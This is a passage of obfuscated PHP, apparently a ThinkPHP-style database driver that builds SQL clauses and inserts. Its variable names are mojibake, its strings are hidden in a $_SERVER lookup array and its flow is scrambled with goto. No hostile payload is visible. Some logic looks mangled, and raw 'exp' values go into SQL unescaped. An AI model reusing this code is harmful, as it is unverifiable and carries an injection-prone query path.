isset($eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[787]][$FÉ∏‡»ÉËÖ]) ? $eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[787]][$FÉ∏‡»ÉËÖ] : $eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[787]][0], $BØûÇ∫±⁄…[17] => isset($eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[17]][$FÉ∏‡»ÉËÖ]) ? $eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[17]][$FÉ∏‡»ÉËÖ] : $eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[17]][0], $BØûÇ∫±⁄…[816] => isset($eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[816]][$FÉ∏‡»ÉËÖ]) ? $eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[816]][$FÉ∏‡»ÉËÖ] : $eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[816]][0], $BØûÇ∫±⁄…[13] => isset($eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[13]][$FÉ∏‡»ÉËÖ]) ? $eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[13]][$FÉ∏‡»ÉËÖ] : $eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[13]][0]); return $this->connect($fæ”‡ËËÇÛ, $FÉ∏‡»ÉËÖ); } public function parseDSN($DÆƒ•¥äˆ„) { $A©ŸÉ÷ü∏÷ =& $_SERVER[Æ¡î¢≠¯™]; if (empty($DÆƒ•¥äˆ„)) { return !1; } $DÔÀÀ∞úÛ¥ = parse_url($DÆƒ•¥äˆ„); if ($DÔÀÀ∞úÛ¥[$A©ŸÉ÷ü∏÷[175]]) { $BÚ’ÛÒ¶∞„ = array($A©ŸÉ÷ü∏÷[864] => $DÔÀÀ∞úÛ¥[$A©ŸÉ÷ü∏÷[175]], $A©ŸÉ÷ü∏÷[788] => isset($DÔÀÀ∞úÛ¥[$A©ŸÉ÷ü∏÷[539]]) ? $DÔÀÀ∞úÛ¥[$A©ŸÉ÷ü∏÷[539]] : $A©ŸÉ÷ü∏÷[33], $A©ŸÉ÷ü∏÷[789] => isset($DÔÀÀ∞úÛ¥[$A©ŸÉ÷ü∏÷[885]]) ? $DÔÀÀ∞úÛ¥[$A©ŸÉ÷ü∏÷[885]] : $A©ŸÉ÷ü∏÷[33], $A©ŸÉ÷ü∏÷[786] => isset($DÔÀÀ∞úÛ¥[$A©ŸÉ÷ü∏÷[176]]) ? $DÔÀÀ∞úÛ¥[$A©ŸÉ÷ü∏÷[176]] : $A©ŸÉ÷ü∏÷[33], $A©ŸÉ÷ü∏÷[787] => isset($DÔÀÀ∞úÛ¥[$A©ŸÉ÷ü∏÷[177]]) ? $DÔÀÀ∞úÛ¥[$A©ŸÉ÷ü∏÷[177]] : $A©ŸÉ÷ü∏÷[33], $A©ŸÉ÷ü∏÷[17] => isset($DÔÀÀ∞úÛ¥[$A©ŸÉ÷ü∏÷[85]]) ? substr($DÔÀÀ∞úÛ¥[$A©ŸÉ÷ü∏÷[85]], 1) : $A©ŸÉ÷ü∏÷[33]); } else { preg_match($A©ŸÉ÷ü∏÷[886], trim($DÆƒ•¥äˆ„), $fÔπµ•áÒª); $BÚ’ÛÒ¶∞„ = array($A©ŸÉ÷ü∏÷[864] => $fÔπµ•áÒª[1], $A©ŸÉ÷ü∏÷[788] => $fÔπµ•áÒª[2], $A©ŸÉ÷ü∏÷[789] => $fÔπµ•áÒª[3], $A©ŸÉ÷ü∏÷[786] => $fÔπµ•áÒª[4], $A©ŸÉ÷ü∏÷[787] => $fÔπµ•áÒª[5], $A©ŸÉ÷ü∏÷[17] => $fÔπµ•áÒª[6]); } $BÚ’ÛÒ¶∞„[$A©ŸÉ÷ü∏÷[816]] = $A©ŸÉ÷ü∏÷[33]; return $BÚ’ÛÒ¶∞„; } protected function debug() { $AåùÑÉñ•è =& $_SERVER[Æ¡î¢≠¯™]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $AåùÑÉñ•è[887]; if (think_config($AåùÑÉñ•è[888])) { think_status($AåùÑÉñ•è[889]); think_trace($this->queryStr . $AåùÑÉñ•è[890] . think_status($AåùÑÉñ•è[20], $AåùÑÉñ•è[889], 6) . $AåùÑÉñ•è[891], $AåùÑÉñ•è[33], $AåùÑÉñ•è[892]); } } protected function parseLock($D˘ŒºﬂŒ‹ù = false) { $E¡©“∆è§® =& $_SERVER[Æ¡î¢≠¯™]; if (!$D˘ŒºﬂŒ‹ù) { return $E¡©“∆è§®[33]; } if ($E¡©“∆è§®[818] == $this->dbType) { return $E¡©“∆è§®[893]; } return $E¡©“∆è§®[894]; } protected function parseSet($e›ﬁÁæ†‹‚) { $AÛ«åùÑæû =& $_SERVER[Æ¡î¢≠¯™]; foreach ($e›ﬁÁæ†‹‚ as $f∫è◊ºı®Ì => $c–…®Øﬂ ) { if (is_array($c–…®Øﬂ ) && $AÛ«åùÑæû[291] == $c–…®Øﬂ [0]) { $bÜÈúß¿Ë›[] = $this->parseKey($f∫è◊ºı®Ì) . $AÛ«åùÑæû[895] . $c–…®Øﬂ [1]; } elseif (is_scalar($c–…®Øﬂ ) || is_null($c–…®Øﬂ )) { $bÜÈúß¿Ë›[] = $this->parseKey($f∫è◊ºı®Ì) . $AÛ«åùÑæû[895] . $this->parseValue($c–…®Øﬂ ); } } return $AÛ«åùÑæû[896] . implode($AÛ«åùÑæû[47], $bÜÈúß¿Ë›); } protected function bindParam($E‰®ÕõË´â, $B»ƒÑ≠úÜé) { $this->bind[$_SERVER[Æ¡î¢≠¯™][4] . $E‰®ÕõË´â] = $B»ƒÑ≠úÜé; } protected function parseBind($BòñÑÌÏøè) { $BòñÑÌÏøè = array_merge($this->bind, $BòñÑÌÏøè); $this->bind = array(); return $BòñÑÌÏøè; } function parseKey(&$Cå®–†»»è, $CÜÔ›¡Óêï = true) { if ($CÜÔ›¡Óêï) { $Cå®–†»»è = $this->parseKeyCheck($Cå®–†»»è); } return $Cå®–†»»è; } function parseKeyCheck($eàâ‘£¿ëƒ) { $cè∏Æ“—Î‚ =& $_SERVER[Æ¡î¢≠¯™]; $eàâ‘£¿ëƒ = trim($eàâ‘£¿ëƒ); if (!preg_match($cè∏Æ“—Î‚[897], $eàâ‘£¿ëƒ)) { think_exception($cè∏Æ“—Î‚[898] . $eàâ‘£¿ëƒ); } return $eàâ‘£¿ëƒ; } protected function parseValue($bñ≥¥¿£…˘) { $eôÉÛ∆¨Êí =& $_SERVER[Æ¡î¢≠¯™]; if (is_string($bñ≥¥¿£…˘)) { $bñ≥¥¿£…˘ = $eôÉÛ∆¨Êí[857] . $this->escapeString($bñ≥¥¿£…˘) . $eôÉÛ∆¨Êí[857]; } elseif (isset($bñ≥¥¿£…˘[0]) && is_string($bñ≥¥¿£…˘[0]) && strtolower($bñ≥¥¿£…˘[0]) == $eôÉÛ∆¨Êí[291]) { $bñ≥¥¿£…˘ = $this->escapeString($bñ≥¥¿£…˘[1]); } elseif (is_array($bñ≥¥¿£…˘)) { $bñ≥¥¿£…˘ = array_map(array($this, $eôÉÛ∆¨Êí[858]), $bñ≥¥¿£…˘); } elseif (is_bool($bñ≥¥¿£…˘)) { $bñ≥¥¿£…˘ = $bñ≥¥¿£…˘ ? $eôÉÛ∆¨Êí[93] : $eôÉÛ∆¨Êí[472]; } elseif (is_null($bñ≥¥¿£…˘)) { $bñ≥¥¿£…˘ = $eôÉÛ∆¨Êí[111]; } return $bñ≥¥¿£…˘; } protected function parseField($B—·ƒ∫±”˜) { $aù›„∆èÃÂ =& $_SERVER[Æ¡î¢≠¯™]; if (is_string($B—·ƒ∫±”˜) && strpos($B—·ƒ∫±”˜, $aù›„∆èÃÂ[47])) { $B—·ƒ∫±”˜ = explode($aù›„∆èÃÂ[47], $B—·ƒ∫±”˜); } if (is_array($B—·ƒ∫±”˜)) { $DÂ–åí∏‚¯ = array(); foreach ($B—·ƒ∫±”˜ as $dûÿ∞Íª∑Ö => $eòëÛ”¯‚Ÿ) { if (!is_numeric($dûÿ∞Íª∑Ö)) { $DÂ–åí∏‚¯[] = $this->parseKey($dûÿ∞Íª∑Ö) . $aù›„∆èÃÂ[899] . $this->parseKey($eòëÛ”¯‚Ÿ); } else { $DÂ–åí∏‚¯[] = $this->parseKey($eòëÛ”¯‚Ÿ); } } $C´‰ŸÙó‘Ñ = implode($aù›„∆èÃÂ[47], $DÂ–åí∏‚¯); } elseif (is_string($B—·ƒ∫±”˜) && !empty($B—·ƒ∫±”˜)) { $C´‰ŸÙó‘Ñ = $B—·ƒ∫±”˜; } else { $C´‰ŸÙó‘Ñ = $aù›„∆èÃÂ[183]; } return $C´‰ŸÙó‘Ñ; } protected function parseTable($b∂â“¡ÍËΩ) { $FŒäÂ≥áâ  =& $_SERVER[Æ¡î¢≠¯™]; if (is_array($b∂â“¡ÍËΩ)) { $bëØ•ËÓΩâ = array(); foreach ($b∂â“¡ÍËΩ as $B‡‹Ù«¥€Ö => $bµ¥∞ÜÓ∂ò) { if (!is_numeric($B‡‹Ù«¥€Ö)) { $bëØ•ËÓΩâ[] = $this->parseKey($B‡‹Ù«¥€Ö) . $FŒäÂ≥áâ [50] . $this->parseKey($bµ¥∞ÜÓ∂ò); } else { $bëØ•ËÓΩâ[] = $this->parseKey($B‡‹Ù«¥€Ö); } } $b∂â“¡ÍËΩ = $bëØ•ËÓΩâ; } elseif (is_string($b∂â“¡ÍËΩ)) { if (strstr($b∂â“¡ÍËΩ, $FŒäÂ≥áâ [50])) { return $b∂â“¡ÍËΩ; } $b∂â“¡ÍËΩ = explode($FŒäÂ≥áâ [47], $b∂â“¡ÍËΩ); array_walk($b∂â“¡ÍËΩ, array($this, $FŒäÂ≥áâ [805])); } return $FŒäÂ≥áâ [900] . trim(implode($FŒäÂ≥áâ [901], $b∂â“¡ÍËΩ), $FŒäÂ≥áâ [811]) . $FŒäÂ≥áâ [900]; } protected function parseWhere($aùÉ©öøÕ◊) { $E—“ÑÕˆïå =& $_SERVER[Æ¡î¢≠¯™]; $c∆§»¬ıÛé = $E—“ÑÕˆïå[33]; if (is_string($aùÉ©öøÕ◊)) { $c∆§»¬ıÛé = $aùÉ©öøÕ◊; } else { $bêÁ…òÒ™ = isset($aùÉ©öøÕ◊[$E—“ÑÕˆïå[902]]) ? strtoupper($aùÉ©öøÕ◊[$E—“ÑÕˆïå[902]]) : $E—“ÑÕˆïå[33]; if (in_array($bêÁ…òÒ™, array($E—“ÑÕˆïå[903], $E—“ÑÕˆïå[904], $E—“ÑÕˆïå[905]))) { $bêÁ…òÒ™ = $E—“ÑÕˆïå[50] . $bêÁ…òÒ™ . $E—“ÑÕˆïå[50]; unset($aùÉ©öøÕ◊[$E—“ÑÕˆïå[902]]); } else { $bêÁ…òÒ™ = $E—“ÑÕˆïå[906]; } foreach ($aùÉ©öøÕ◊ as $dôøœ«¡ºÒ => $DÚ¿Æ‘πê–) { $c∆§»¬ıÛé .= $E—“ÑÕˆïå[271]; if (is_numeric($dôøœ«¡ºÒ)) { $dôøœ«¡ºÒ = $E—“ÑÕˆïå[907]; } if (0 === strpos($dôøœ«¡ºÒ, $E—“ÑÕˆïå[80])) { $c∆§»¬ıÛé .= $this->parseThinkWhere($dôøœ«¡ºÒ, $DÚ¿Æ‘πê–); } else { if (!preg_match($E—“ÑÕˆïå[908], trim($dôøœ«¡ºÒ))) { think_exception(think_lang($E—“ÑÕˆïå[909]) . $E—“ÑÕˆïå[4] . $dôøœ«¡ºÒ); } $dã•àè¬ˆÜ = is_array($DÚ¿Æ‘πê–) && isset($DÚ¿Æ‘πê–[$E—“ÑÕˆïå[910]]); $dôøœ«¡ºÒ = trim($dôøœ«¡ºÒ); if (strpos($dôøœ«¡ºÒ, $E—“ÑÕˆïå[277])) { $E∞Á»÷ùä∫ = explode($E—“ÑÕˆïå[277], $dôøœ«¡ºÒ); $bΩÔêÙûá≈ = array(); foreach ($E∞Á»÷ùä∫ as $EÿîÛ¯ıÏ» => $E™¿Á•§”•) { $D…¡à∞Ã—Û = $dã•àè¬ˆÜ ? $DÚ¿Æ‘πê–[$EÿîÛ¯ıÏ»] : $DÚ¿Æ‘πê–; $bΩÔêÙûá≈[] = $E—“ÑÕˆïå[254] . $this->parseWhereItem($this->parseKey($E™¿Á•§”•), $D…¡à∞Ã—Û) . $E—“ÑÕˆïå[804]; } $c∆§»¬ıÛé .= implode($E—“ÑÕˆïå[911], $bΩÔêÙûá≈); } elseif (strpos($dôøœ«¡ºÒ, $E—“ÑÕˆïå[278])) { $E∞Á»÷ùä∫ = explode($E—“ÑÕˆïå[278], $dôøœ«¡ºÒ); $bΩÔêÙûá≈ = array(); foreach ($E∞Á»÷ùä∫ as $EÿîÛ¯ıÏ» => $E™¿Á•§”•) { $D…¡à∞Ã—Û = $dã•àè¬ˆÜ ? $DÚ¿Æ‘πê–[$EÿîÛ¯ıÏ»] : $DÚ¿Æ‘πê–; $bΩÔêÙûá≈[] = $E—“ÑÕˆïå[254] . $this->parseWhereItem($this->parseKey($E™¿Á•§”•), $D…¡à∞Ã—Û) . $E—“ÑÕˆïå[804]; } $c∆§»¬ıÛé .= implode($E—“ÑÕˆïå[906], $bΩÔêÙûá≈); } else { $c∆§»¬ıÛé .= $this->parseWhereItem($this->parseKey($dôøœ«¡ºÒ), $DÚ¿Æ‘πê–); } } $c∆§»¬ıÛé .= $E—“ÑÕˆïå[272] . $bêÁ…òÒ™; } $c∆§»¬ıÛé = substr($c∆§»¬ıÛé, 0, -strlen($bêÁ…òÒ™)); } return empty($c∆§»¬ıÛé) ? $E—“ÑÕˆïå[33] : $E—“ÑÕˆïå[912] . $c∆§»¬ıÛé; } protected function parseWhereItem($f÷‘±ÊêÏÒ, $C†ÇπÈπÍ) { $FéƒÂÕÂ∏Ÿ =& $_SERVER[Æ¡î¢≠¯™]; $f∏–”À¥ ß = $FéƒÂÕÂ∏Ÿ[33]; if (is_array($C†ÇπÈπÍ)) { if (is_string($C†ÇπÈπÍ[0])) { $D÷å°Éı∞€ = strtolower($C†ÇπÈπÍ[0]); if (in_array($C†ÇπÈπÍ[0], array($FéƒÂÕÂ∏Ÿ[895], $FéƒÂÕÂ∏Ÿ[913], $FéƒÂÕÂ∏Ÿ[914], $FéƒÂÕÂ∏Ÿ[915], $FéƒÂÕÂ∏Ÿ[916], $FéƒÂÕÂ∏Ÿ[917]))) { $f∏–”À¥ ß .= $f÷‘±ÊêÏÒ . $FéƒÂÕÂ∏Ÿ[50] . $C†ÇπÈπÍ[0] . $FéƒÂÕÂ∏Ÿ[50] . $this->parseValue($C†ÇπÈπÍ[1]); } elseif (preg_match($FéƒÂÕÂ∏Ÿ[918], $C†ÇπÈπÍ[0])) { $f∏–”À¥ ß .= $f÷‘±ÊêÏÒ . $FéƒÂÕÂ∏Ÿ[50] . $this->exp[$D÷å°Éı∞€] . $FéƒÂÕÂ∏Ÿ[50] . $this->parseValue($C†ÇπÈπÍ[1]); } elseif (preg_match($FéƒÂÕÂ∏Ÿ[919], $C†ÇπÈπÍ[0])) { if (is_array($C†ÇπÈπÍ[1])) { $C∑üàùÓÑç = isset($C†ÇπÈπÍ[2]) ? strtoupper($C†ÇπÈπÍ[2]) : $FéƒÂÕÂ∏Ÿ[904]; if (in_array($C∑üàùÓÑç, array($FéƒÂÕÂ∏Ÿ[903], $FéƒÂÕÂ∏Ÿ[904], $FéƒÂÕÂ∏Ÿ[905]))) { $DÌŸ∑©Ê£◊ = array(); foreach ($C†ÇπÈπÍ[1] as $eê∆µÜ˜“ã) { $DÌŸ∑©Ê£◊[] = $f÷‘±ÊêÏÒ . $FéƒÂÕÂ∏Ÿ[50] . $this->exp[$D÷å°Éı∞€] . $FéƒÂÕÂ∏Ÿ[50] . $this->parseValue($eê∆µÜ˜“ã); } $f∏–”À¥ ß .= $FéƒÂÕÂ∏Ÿ[254] . implode($FéƒÂÕÂ∏Ÿ[50] . $C∑üàùÓÑç . $FéƒÂÕÂ∏Ÿ[50], $DÌŸ∑©Ê£◊) . $FéƒÂÕÂ∏Ÿ[804]; } } else { $f∏–”À¥ ß .= $f÷‘±ÊêÏÒ . $FéƒÂÕÂ∏Ÿ[50] . $this->exp[$D÷å°Éı∞€] . $FéƒÂÕÂ∏Ÿ[50] . $this->parseValue($C†ÇπÈπÍ[1]); } } elseif ($FéƒÂÕÂ∏Ÿ[291] == $D÷å°Éı∞€) { $f∏–”À¥ ß .= $FéƒÂÕÂ∏Ÿ[802] . $f÷‘±ÊêÏÒ . $FéƒÂÕÂ∏Ÿ[50] . $C†ÇπÈπÍ[1] . $FéƒÂÕÂ∏Ÿ[920]; } elseif (preg_match($FéƒÂÕÂ∏Ÿ[921], $C†ÇπÈπÍ[0])) { if (isset($C†ÇπÈπÍ[2]) && $FéƒÂÕÂ∏Ÿ[291] == $C†ÇπÈπÍ[2]) { $f∏–”À¥ ß .= $f÷‘±ÊêÏÒ . $FéƒÂÕÂ∏Ÿ[50] . $this->exp[$D÷å°Éı∞€] . $FéƒÂÕÂ∏Ÿ[50] . $C†ÇπÈπÍ[1]; } else { if (is_string($C†ÇπÈπÍ[1])) { $C†ÇπÈπÍ[1] = explode($FéƒÂÕÂ∏Ÿ[47], $C†ÇπÈπÍ[1]); } $Cú˘òãëÆÜ = implode($FéƒÂÕÂ∏Ÿ[47], $this->parseValue($C†ÇπÈπÍ[1])); $f∏–”À¥ ß .= $f÷‘±ÊêÏÒ . $FéƒÂÕÂ∏Ÿ[50] . $this->exp[$D÷å°Éı∞€] . $FéƒÂÕÂ∏Ÿ[802] . $Cú˘òãëÆÜ . $FéƒÂÕÂ∏Ÿ[804]; } } elseif (preg_match($FéƒÂÕÂ∏Ÿ[922], $C†ÇπÈπÍ[0])) { $Dùœ∏¨–åò = is_string($C†ÇπÈπÍ[1]) ? explode($FéƒÂÕÂ∏Ÿ[47], $C†ÇπÈπÍ[1]) : $C†ÇπÈπÍ[1]; $f∏–”À¥ ß .= $FéƒÂÕÂ∏Ÿ[802] . $f÷‘±ÊêÏÒ . $FéƒÂÕÂ∏Ÿ[50] . $this->exp[$D÷å°Éı∞€] . $FéƒÂÕÂ∏Ÿ[50] . $this->parseValue($Dùœ∏¨–åò[0]) . $FéƒÂÕÂ∏Ÿ[906] . $this->parseValue($Dùœ∏¨–åò[1]) . $FéƒÂÕÂ∏Ÿ[272]; } else { think_exception(think_lang($FéƒÂÕÂ∏Ÿ[909]) . $FéƒÂÕÂ∏Ÿ[4] . $C†ÇπÈπÍ[0]); } } else { $dÉÉÎÕ±î© = count($C†ÇπÈπÍ); $Dâ‚íè£Â« = isset($C†ÇπÈπÍ[$dÉÉÎÕ±î© - 1]) ? strtoupper($C†ÇπÈπÍ[$dÉÉÎÕ±î© - 1]) : $FéƒÂÕÂ∏Ÿ[33]; if (in_array($Dâ‚íè£Â«, array($FéƒÂÕÂ∏Ÿ[903], $FéƒÂÕÂ∏Ÿ[904], $FéƒÂÕÂ∏Ÿ[905]))) { $dÉÉÎÕ±î© = $dÉÉÎÕ±î© - 1; } else { $Dâ‚íè£Â« = $FéƒÂÕÂ∏Ÿ[903]; } for ($fûÀ·∑¥©¶ = 0; $fûÀ·∑¥©¶ < $dÉÉÎÕ±î©; $fûÀ·∑¥©¶++) { $Dùœ∏¨–åò = is_array($C†ÇπÈπÍ[$fûÀ·∑¥©¶]) ? $C†ÇπÈπÍ[$fûÀ·∑¥©¶][1] : $C†ÇπÈπÍ[$fûÀ·∑¥©¶]; if ($FéƒÂÕÂ∏Ÿ[291] == strtolower($C†ÇπÈπÍ[$fûÀ·∑¥©¶][0])) { $f∏–”À¥ ß .= $FéƒÂÕÂ∏Ÿ[254] . $f÷‘±ÊêÏÒ . $FéƒÂÕÂ∏Ÿ[50] . $Dùœ∏¨–åò . $FéƒÂÕÂ∏Ÿ[920] . $Dâ‚íè£Â« . $FéƒÂÕÂ∏Ÿ[50]; } else { $A˘®òü™˘ = is_array($C†ÇπÈπÍ[$fûÀ·∑¥©¶]) ? $this->exp[strtolower($C†ÇπÈπÍ[$fûÀ·∑¥©¶][0])] : $FéƒÂÕÂ∏Ÿ[895]; if (!$A˘®òü™˘ && is_array($C†ÇπÈπÍ[$fûÀ·∑¥©¶]) && in_array($C†ÇπÈπÍ[$fûÀ·∑¥©¶][0], array($FéƒÂÕÂ∏Ÿ[895], $FéƒÂÕÂ∏Ÿ[913], $FéƒÂÕÂ∏Ÿ[914], $FéƒÂÕÂ∏Ÿ[915], $FéƒÂÕÂ∏Ÿ[916], $FéƒÂÕÂ∏Ÿ[917]))) { $A˘®òü™˘ = $C†ÇπÈπÍ[$fûÀ·∑¥©¶][0]; } $f∏–”À¥ ß .= $FéƒÂÕÂ∏Ÿ[254] . $f÷‘±ÊêÏÒ . $FéƒÂÕÂ∏Ÿ[50] . $A˘®òü™˘ . $FéƒÂÕÂ∏Ÿ[50] . $this->parseValue($Dùœ∏¨–åò) . $FéƒÂÕÂ∏Ÿ[920] . $Dâ‚íè£Â« . $FéƒÂÕÂ∏Ÿ[50]; } } $f∏–”À¥ ß = substr($f∏–”À¥ ß, 0, -4); } } else { $f∏–”À¥ ß .= $f÷‘±ÊêÏÒ . $FéƒÂÕÂ∏Ÿ[923] . $this->parseValue($C†ÇπÈπÍ); } return $f∏–”À¥ ß; } protected function parseThinkWhere($Dèﬂﬁ«Ïƒı, $C≈É›´Ù√ô) { $FÕÀí£ı¿‰ =& $_SERVER[Æ¡î¢≠¯™]; $f¯¡ü≈–ˆÕ = $FÕÀí£ı¿‰[33]; switch ($Dèﬂﬁ«Ïƒı) { case $FÕÀí£ı¿‰[345]: $f¯¡ü≈–ˆÕ = $C≈É›´Ù√ô; break; case $FÕÀí£ı¿‰[907]: $f¯¡ü≈–ˆÕ = is_string($C≈É›´Ù√ô) ? $C≈É›´Ù√ô : substr($this->parseWhere($C≈É›´Ù√ô), 6); break; case $FÕÀí£ı¿‰[924]: parse_str($C≈É›´Ù√ô, $b∑‹Øùˆıç); if (isset($b∑‹Øùˆıç[$FÕÀí£ı¿‰[902]])) { $C÷àÆıìæß = $FÕÀí£ı¿‰[50] . strtoupper($b∑‹Øùˆıç[$FÕÀí£ı¿‰[902]]) . $FÕÀí£ı¿‰[50]; unset($b∑‹Øùˆıç[$FÕÀí£ı¿‰[902]]); } else { $C÷àÆıìæß = $FÕÀí£ı¿‰[906]; } $B¶ƒô∏áÏ¥ = array(); foreach ($b∑‹Øùˆıç as $a‚ªæ±ˆøµ => $aˆ”†Áı‡ç) { $B¶ƒô∏áÏ¥[] = $this->parseKey($a‚ªæ±ˆøµ) . $FÕÀí£ı¿‰[923] . $this->parseValue($aˆ”†Áı‡ç); } $f¯¡ü≈–ˆÕ = implode($C÷àÆıìæß, $B¶ƒô∏áÏ¥); break; } return $f¯¡ü≈–ˆÕ; } protected function parseLimit($C“ÙÒõÜûÚ) { $fÈâÔôÆ…§ =& $_SERVER[Æ¡î¢≠¯™]; return !empty($C“ÙÒõÜûÚ) ? $fÈâÔôÆ…§[48] . $C“ÙÒõÜûÚ . $fÈâÔôÆ…§[50] : $fÈâÔôÆ…§[33]; } protected function parseJoin($cøèÓ˜Ïóº) { $f©©◊≠ŒÑã =& $_SERVER[Æ¡î¢≠¯™]; $bæÃÁﬁ∑ì€ = $f©©◊≠ŒÑã[33]; if (!empty($cøèÓ˜Ïóº)) { if (is_array($cøèÓ˜Ïóº)) { foreach ($cøèÓ˜Ïóº as $D‘ˆıáÕ¬á => $bÇ“ëú‹º™) { if (!1 !== stripos($bÇ“ëú‹º™, $f©©◊≠ŒÑã[925])) { $bæÃÁﬁ∑ì€ .= $f©©◊≠ŒÑã[50] . $bÇ“ëú‹º™; } else { $bæÃÁﬁ∑ì€ .= $f©©◊≠ŒÑã[926] . $bÇ“ëú‹º™; } } } else { $bæÃÁﬁ∑ì€ .= $f©©◊≠ŒÑã[926] . $cøèÓ˜Ïóº; } } $bæÃÁﬁ∑ì€ = preg_replace($f©©◊≠ŒÑã[927], think_config($f©©◊≠ŒÑã[830]) . $f©©◊≠ŒÑã[928], $bæÃÁﬁ∑ì€); return $bæÃÁﬁ∑ì€; } protected function parseOrder($FéºÊ›Œòü) { $dÈ˘ˆÖ˘óÔ =& $_SERVER[Æ¡î¢≠¯™]; if (is_array($FéºÊ›Œòü)) { $aèËÁßñçï = array(); foreach ($FéºÊ›Œòü as $Aı•õ¢ùÎè => $AöÖÛÿÊ∫§) { if (is_numeric($Aı•õ¢ùÎè)) { $aèËÁßñçï[] = $this->parseKey($AöÖÛÿÊ∫§); } else { $AöÖÛÿÊ∫§ = in_array(strtoupper(trim($AöÖÛÿÊ∫§)), array($dÈ˘ˆÖ˘óÔ[929], $dÈ˘ˆÖ˘óÔ[930])) ? $dÈ˘ˆÖ˘óÔ[50] . $AöÖÛÿÊ∫§ : $dÈ˘ˆÖ˘óÔ[33]; if (preg_match($dÈ˘ˆÖ˘óÔ[931], $Aı•õ¢ùÎè)) { $aèËÁßñçï[] = $this->parseKey($Aı•õ¢ùÎè) . $AöÖÛÿÊ∫§; } else { think_exception($dÈ˘ˆÖ˘óÔ[932] . $Aı•õ¢ùÎè); } } } $FéºÊ›Œòü = implode($dÈ˘ˆÖ˘óÔ[47], $aèËÁßñçï); } return !empty($FéºÊ›Œòü) ? $dÈ˘ˆÖ˘óÔ[933] . $FéºÊ›Œòü : $dÈ˘ˆÖ˘óÔ[33]; } protected function parseGroup($Fˆ—ã¬∂‚º) { $b¡º¿£†Û =& $_SERVER[Æ¡î¢≠¯™]; return !empty($Fˆ—ã¬∂‚º) ? $b¡º¿£†Û[934] . $Fˆ—ã¬∂‚º : $b¡º¿£†Û[33]; } protected function parseHaving($aä”Æèõª„) { $B¯∏˜ªü⁄» =& $_SERVER[Æ¡î¢≠¯™]; return !empty($aä”Æèõª„) ? $B¯∏˜ªü⁄»[935] . $aä”Æèõª„ : $B¯∏˜ªü⁄»[33]; } protected function parseComment($cêúœ∆£æ¨) { $e‰»Ê«–™á =& $_SERVER[Æ¡î¢≠¯™]; return !empty($cêúœ∆£æ¨) ? $e‰»Ê«–™á[936] . $cêúœ∆£æ¨ . $e‰»Ê«–™á[937] : $e‰»Ê«–™á[33]; } protected function parseDistinct($c¢û≈·«ÏÏ) { $d◊≈ä·˘ê© =& $_SERVER[Æ¡î¢≠¯™]; return !empty($c¢û≈·«ÏÏ) ? $d◊≈ä·˘ê©[938] : $d◊≈ä·˘ê©[33]; } protected function parseUnion($f §ò¥´É¨) { $E∞Ï’Ω•€ä =& $_SERVER[Æ¡î¢≠¯™]; if (empty($f §ò¥´É¨)) { return $E∞Ï’Ω•€ä[33]; } if (isset($f §ò¥´É¨[$E∞Ï’Ω•€ä[342]])) { $b´ê†´∏Í— = $E∞Ï’Ω•€ä[939]; unset($f §ò¥´É¨[$E∞Ï’Ω•€ä[342]]); } else { $b´ê†´∏Í— = $E∞Ï’Ω•€ä[940]; } foreach ($f §ò¥´É¨ as $eÎí£ÖïÕå) { $aúøƒ…∫í‡[] = $b´ê†´∏Í— . (is_array($eÎí£ÖïÕå) ? $this->buildSelectSql($eÎí£ÖïÕå) : $eÎí£ÖïÕå); } return implode($E∞Ï’Ω•€ä[50], $aúøƒ…∫í‡); } public function insert($BÑ√ûÿ≥ﬂï, $d¥≠∆ö€„» = array(), $AË©Ìà©˜ÿ = false) { goto C¬µåùÃ»ç; C¬µåùÃ»ç: $bÌä§ãÌö≈ =& $_SERVER[Æ¡î¢≠¯™]; $aö©ÆÚºñœ = $Bõó±·‡®∏ = array(); $this->model = $d¥≠∆ö€„»[$bÌä§ãÌö≈[275]]; goto Aç†πÎÀä˜; F≥íû™èÈﬂ: $FøËè‘ç†≥ .= $this->parseComment(!empty($d¥≠∆ö€„»[$bÌä§ãÌö≈[347]]) ? $d¥≠∆ö€„»[$bÌä§ãÌö≈[347]] : $bÌä§ãÌö≈[33]); return $this->execute($FøËè‘ç†≥, $this->parseBind(!empty($d¥≠∆ö€„»[$bÌä§ãÌö≈[279]]) ? $d¥≠∆ö€„»[$bÌä§ãÌö≈[279]] : array())); goto bÌ°‡ÖñÎ‡; Aç†πÎÀä˜: foreach ($BÑ√ûÿ≥ﬂï as $FùÚË£⁄ˆÉ => $A«⁄ºà›Ùó) { if (is_array($A«⁄ºà›Ùó) && $bÌä§ãÌö≈[291] == $A«⁄ºà›Ùó[0]) { $Bõó±·‡®∏[] = $this->parseKey($FùÚË£⁄ˆÉ); $aö©ÆÚºñœ[] = $A«⁄ºà›Ùó[1]; } elseif (is_scalar($A«⁄ºà›Ùó) || is_null($A«⁄ºà›Ùó)) { $Bõó±·‡®∏[] = $this->parseKey($FùÚË£⁄ˆÉ); $aö©ÆÚºñœ[] = $this->parseValue($A«⁄ºà›Ùó); } } $FøËè‘ç†≥ = ($AË©Ìà©˜ÿ ? $bÌä§ãÌö≈[806] : $bÌä§ãÌö≈[807]) . $bÌä§ãÌö≈[808] . $this->parseTable($d¥≠∆ö€„»[$bÌä§ãÌö≈[273]]) . $bÌä§ãÌö≈[802] . implode($bÌä§ãÌö≈[47], $Bõó±·‡®∏) . $bÌä§ãÌö≈[803] . implode($bÌä§ãÌö≈[47], $aö©ÆÚºñœ) . $bÌä§ãÌö≈[804]; $FøËè‘ç†≥ .= $this->parseLock(isset($d¥≠∆ö€„»[$bÌä§ãÌö≈[762]]) ? $d¥≠∆ö€„»[$bÌä§ãÌö≈[762]] : !1); goto F≥íû™èÈﬂ; bÌ°‡ÖñÎ‡: } public function selectInsert($aòŒ÷¬Ö ±, $a™≈”Ó•Êõ, $DØ£é—ÙΩú = array()) { goto C≠∞≥·Ù€∞; fÖäïÖ®ŒÈ: return $this->execute($cﬁÂ–ùÃ÷æ, 